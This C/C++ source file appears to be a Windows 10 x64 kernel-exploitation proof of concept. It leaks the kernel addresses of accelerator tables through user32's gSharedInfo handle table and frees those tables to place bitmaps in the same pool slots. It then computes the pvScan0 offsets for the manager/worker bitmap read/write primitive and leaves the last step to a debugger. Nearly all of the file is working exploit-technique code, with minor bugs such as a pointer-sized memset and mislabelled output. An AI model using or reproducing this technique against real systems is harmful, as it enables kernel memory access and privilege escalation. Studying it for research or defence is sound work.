// bitmap_win10_x64_accelerator_table_leak.cpp : This file contains the 'main' function. Program execution begins and ends there.
/*cl bitmap_win10_x64_leak.c /I . */
/*
fffff09cc3b1e000 is not a valid large pool allocation, checking large session pool...
*fffff09cc3b1e000 : large page allocation, tag is Usac, size is 0x1070 bytes
Pooltag Usac : USERTAG_ACCEL, Binary : win32k!_CreateAcceleratorTable

*/

#include "pch.h"
#include <stdio.h>
#include <windows.h>
#include "structures.h"

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "User32.lib")

#define object_number 0x02
#define accel_array_size 0x2b5

// Define global variables
HMODULE ntdll;
HMODULE user32dll;

// Define required structures
struct bitmap_structure {
	HBITMAP manager_bitmap;
	HBITMAP worker_bitmap;
};

struct bitmap_structure create_bitmaps(HACCEL hAccel[object_number]) {

	printf("[+] Replacing Accelerator Tables with BitMap objects\n");

	// Define variables for BitMap creation
	struct bitmap_structure bitmaps;
	char *manager_bitmap_memory;
	char *worker_bitmap_memory;
	HBITMAP manager_bitmap;
	HBITMAP worker_bitmap;
	int nWidth = 1789;
	int nHeight = 2;
	unsigned int cPlanes = 1;
	unsigned int cBitsPerPel = 8;
	const void *manager_lpvBits;
	const void *worker_lpvBits;

	// Allocating memory for lvpBits
	manager_bitmap_memory = (char *)malloc(nWidth * nHeight);
	memset(manager_bitmap_memory, 0x00, sizeof(manager_bitmap_memory));
	manager_lpvBits = manager_bitmap_memory;

	worker_bitmap_memory = (char *)malloc(nWidth * nHeight);
	memset(worker_bitmap_memory, 0x00, sizeof(worker_bitmap_memory));
	worker_lpvBits = worker_bitmap_memory;

	// Creating the BitMaps
	DestroyAcceleratorTable(hAccel[0]);
	manager_bitmap = CreateBitmap(nWidth, nHeight, cPlanes, cBitsPerPel, manager_lpvBits);
	if (manager_bitmap == NULL) {
		printf("[!] Failed to create BitMap object: %d\n", GetLastError());
		exit(1);
	}
	printf("[+] Manager BitMap HANDLE: %p\n", manager_bitmap);

	DestroyAcceleratorTable(hAccel[1]);
	worker_bitmap = CreateBitmap(nWidth, nHeight, cPlanes, cBitsPerPel, worker_lpvBits);
	if (worker_bitmap == NULL) {
		printf("[!] Failed to create BitMap object: %d\n", GetLastError());
		exit(1);
	}
	printf("[+] Worker BitMap HANDLE: %p\n", worker_bitmap);

	bitmaps.manager_bitmap = manager_bitmap;
	bitmaps.worker_bitmap = worker_bitmap;
	return bitmaps;
}

PHANDLEENTRY leak_table_kernel_address(HMODULE user32dll, HACCEL hAccel[object_number], PHANDLEENTRY handle_entry[object_number]) {

	int i;
	PSHAREDINFO gSharedInfo;
	ULONGLONG aheList;
	DWORD handle_entry_size = 0x18;

	gSharedInfo = (PSHAREDINFO)GetProcAddress(user32dll, (LPCSTR)"gSharedInfo");
	if (gSharedInfo == NULL) {
		printf("[!] Error while retrieving gSharedInfo: %d.\n", GetLastError());
		return NULL;
	}
	aheList = (ULONGLONG)gSharedInfo->aheList;
	printf("[+] USER32!gSharedInfo located at: %p\n", gSharedInfo);
	printf("[+] USER32!gSharedInfo->aheList located at: %I64x\n", aheList);

	/*
	Calculate the offset in the aheList using the following formula:
	_HANDLEENTRY = aheList + ( hAccel & 0xffff ) * 0x18

	- hAccel & 0xffff means we use the first 3 bytes as an offset in the aheList (Example: 0x000000000031037d & 0xffff = 00000000`0000037d)
	- 0x18 is the size of each _HANDLEENTRY structure (on 32 bit it's 0xC), see structures.h
	*/

	for (i = 0; i < object_number; i++) {
		handle_entry[i] = (PHANDLEENTRY)(aheList + ((ULONGLONG)hAccel[i] & 0xffff) * handle_entry_size);
	}
	return *handle_entry;
}

ULONGLONG write_bitmap(HBITMAP bitmap_handle, ULONGLONG to_write) {

	ULONGLONG write_operation;
	write_operation = SetBitmapBits(bitmap_handle, sizeof(ULONGLONG), &to_write);
	if (write_operation == 0) {
		printf("[!] Failed to write bits to bitmap: %d\n", GetLastError());
		exit(1);
	}

	return 0;
}

ULONGLONG read_bitmap(HBITMAP bitmap_handle) {

	ULONGLONG read_operation;
	ULONGLONG to_read;
	read_operation = GetBitmapBits(bitmap_handle, sizeof(ULONGLONG), &to_read);
	if (read_operation == 0) {
		printf("[!] Failed to write bits to bitmap: %d\n", GetLastError());
		exit(1);
	}

	return to_read;
}

HACCEL create_accelerator_table(HACCEL hAccel[object_number], int table_number) {

	table_number = object_number;
	int i;
	ACCEL accel_array[accel_array_size];
	LPACCEL lpAccel = accel_array;

	printf("[+] Creating %d Accelerator Tables\n", table_number);
	for (i = 0; i < table_number; i++) {
		hAccel[i] = CreateAcceleratorTableA(lpAccel, accel_array_size);
		if (hAccel[i] == NULL) {
			printf("[!] Error while creating the accelerator table: %d.\n", GetLastError());
			exit(1);
		}
	}

	return *hAccel;
}

int main() {

	// Get NTDLL module
	ntdll = LoadLibraryA("ntdll");
	if (ntdll == NULL) {
		printf("[!] Error while loading ntdll: %d\n", GetLastError());
		return 1;
	}

	// Get USER32 module
	user32dll = LoadLibraryA("user32");
	if (user32dll == NULL) {
		printf("[!] Error while loading user32: %d.\n", GetLastError());
		return 1;
	}

	// Create Accelerator Table
	HACCEL hAccel[object_number];
	create_accelerator_table(hAccel, object_number);

	// Leak Accelerator Table
	PHANDLEENTRY handle_entry[object_number];
	leak_table_kernel_address(user32dll, hAccel, handle_entry);

	printf(
		"[+] Accelerator Table[0] HANDLE: %p\n"
		"[+] Accelerator Table[0] HANDLE: %p\n"
		"[+] Accelerator Table[0] kernel address: %I64x\n"
		"[+] Accelerator Table[0] kernel address: %I64x\n",
		hAccel[0],
		hAccel[1],
		(ULONGLONG)handle_entry[0]->pHeader,
		(ULONGLONG)handle_entry[1]->pHeader
	);

	// Save values before they are replaced with BitMaps
	ULONGLONG manager_pvScan_offset;
	ULONGLONG worker_pvScan_offset;
	manager_pvScan_offset = (ULONGLONG)handle_entry[0]->pHeader + 0x18 + 0x38;
	worker_pvScan_offset = (ULONGLONG)handle_entry[1]->pHeader + 0x18 + 0x38;


	// Create Bitmaps
	struct bitmap_structure bitmaps;
	bitmaps = create_bitmaps(hAccel);


	// Testing this out
	printf("[+] Manager BitMap pvScan0 offset: %I64x\n", manager_pvScan_offset);
	printf("[+] Worker BitMap pvScan0 offset: %I64x\n", worker_pvScan_offset);

	printf(
		"\n[+] Use the debugger to write %I64x (pvScan0 offset of worker) to pvScan0 of Manager\n"
		"[+] Make sure you change the actual Manager pvScan0 and not the offset\n"
		"[+] Use \"SetBitmapBits\" on Manager to select address for read/write\n"
		"[+] Use \"GetBitmapBits\"/\"SetBitmapBits\" on Worker to read/write previously set address",
		(ULONGLONG)worker_pvScan_offset
	);

	getchar();

	/*
	ULONGLONG test_write = 0x4141414141414141;
	write_bitmap(bitmaps.manager_bitmap, test_write);

	ULONGLONG test_read;
	test_read = read_bitmap(bitmaps.manager_bitmap);
	printf("\n[+] Ok now I read: %I64x\n", test_read);
	*/

	printf("\n[!] Stopping execution for debugging purposes\n");
	getchar();
	return 0;
}